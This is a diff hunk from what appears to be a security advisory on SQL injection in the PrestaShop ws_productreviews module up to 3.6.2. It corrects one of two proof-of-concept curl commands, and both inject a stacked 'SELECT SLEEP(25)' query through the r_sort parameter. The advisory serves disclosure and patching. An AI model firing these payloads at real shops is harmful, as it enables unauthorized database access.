@@ -52,7 +52,7 @@ In ws_productreviews module for PrestaShop up to 3.6.2, multiple sensitives SQL 
 
 ```bash
 curl -v 'https://domain.tld/module/ws_productreviews/default?r_sort=date_add%60%3BSELECT%20SLEEP%2825%29%23'
-curl -v 'https://domain.tld/module/ws_productreviews/default?action=getList&r_sort=date_add%60%60%3BSELECT%20SLEEP%2825%29%23'
+curl -v 'https://domain.tld/module/ws_productreviews/default?action=getList&r_sort=date_add%60%3BSELECT%20SLEEP%2825%29%23'
 ```
 
 ## Patch
